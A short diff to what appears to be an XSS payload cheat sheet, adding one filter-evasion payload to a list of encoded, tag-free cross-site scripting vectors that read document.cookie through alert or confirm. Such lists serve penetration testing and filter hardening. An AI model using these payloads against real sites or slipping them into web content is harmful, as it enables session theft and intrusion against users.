@@ -218,6 +218,7 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   <svg><animate%20onend=alert(document.cookie)%20attributeName=x%20dur=1s>
   <h1/%6f%6e/oNclicK=alert`hacked`>APTH
   "%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+  "><D3V%0aONPoiNtERENTEr%0d=%0d[document.cookie].find(confirm)%0dx>
   ```
 </details>
 
